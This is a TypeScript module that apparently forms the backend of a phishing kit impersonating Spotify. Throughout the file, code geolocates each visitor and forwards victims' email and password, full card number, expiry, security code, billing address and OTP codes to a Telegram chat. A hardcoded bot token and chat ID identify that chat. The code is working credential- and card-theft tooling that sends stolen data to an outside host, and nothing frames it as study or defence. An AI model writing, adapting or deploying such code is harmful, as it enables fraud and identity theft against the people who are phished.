import { getConfig } from './config-storage';

// This module is used in API routes (server-side)
// It now dynamically fetches configuration from the persistent store

export function getTelegramConfig() {
  const config = getConfig();
  return {
    BOT_TOKEN: config.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "8361020073:AAFfPXu1trr71fxQXKVA0xU5WX_f9z8IN6Y",
    CHAT_ID: config.telegramChatId || process.env.TELEGRAM_CHAT_ID || "5219969216",
  };
}

export async function sendTelegramNotification(message: string, ip?: string, showButtons: boolean = false) {
  try {
    const config = getTelegramConfig();
    const body: any = {
      chat_id: config.CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }

    const response = await fetch(`https://api.telegram.org/bot${config.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error("Telegram notification failed:", response.statusText, errorData)
    }
  } catch (error) {
    console.error("Error sending Telegram notification:", error)
  }
}

export async function getVisitorInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/")
    const data = await response.json()
    return {
      ip: data.ip,
      country: data.country_name,
      city: data.city,
      region: data.region,
    }
  } catch (error) {
    console.error("Error getting visitor info:", error)
    return {
      ip: "Unknown",
      country: "Unknown",
      city: "Unknown",
      region: "Unknown",
    }
  }
}

export async function notifyNewVisitor(visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>) {
  const message = `
🎵 <b>NEW SPOTIFY VISITOR</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 Country: <code>${visitorInfo.country}</code>
🏙️ City: <code>${visitorInfo.city}</code>
📍 Region: <code>${visitorInfo.region}</code>
🖥️ IP Address: <code>${visitorInfo.ip}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
  await sendTelegramNotification(message, visitorInfo.ip, true)
}

export async function notifyLogin(email: string, password: string, visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>) {
  const message = `
🔐 <b>LOGIN INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
🌍 Country: <code>${visitorInfo.country}</code>
🖥️ IP Address: <code>${visitorInfo.ip}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
  await sendTelegramNotification(message, visitorInfo.ip, true)
}

export async function notifyPaymentInfo(
  cardData: {
    cardNumber: string
    expirationDate: string
    securityCode: string
    fullName: string
    address: string
    city: string
    postalCode: string
    country: string
  },
  visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>
) {
  const message = `
💳 <b>PAYMENT & BILLING INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Card Details:</b>
💳 Card Number: <code>${cardData.cardNumber}</code>
📅 Expiration: <code>${cardData.expirationDate}</code>
🔐 Security Code: <code>${cardData.securityCode}</code>

<b>Billing Information:</b>
👤 Full Name: <code>${cardData.fullName}</code>
📍 Address: <code>${cardData.address}</code>
🏙️ City: <code>${cardData.city}</code>
📮 Postal Code: <code>${cardData.postalCode}</code>
🌍 Country: <code>${cardData.country}</code>

🖥️ IP Address: <code>${visitorInfo.ip}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
  await sendTelegramNotification(message, visitorInfo.ip, true)
}

export async function notifyOTPAttempt(otp: string, isCorrect: boolean, visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>) {
  const status = isCorrect ? "✅ CORRECT" : "❌ INCORRECT"
  const message = `
🔑 <b>OTP ATTEMPT - ${status}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 OTP Code: <code>${otp}</code>
🖥️ IP Address: <code>${visitorInfo.ip}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
  await sendTelegramNotification(message, visitorInfo.ip, true)
}
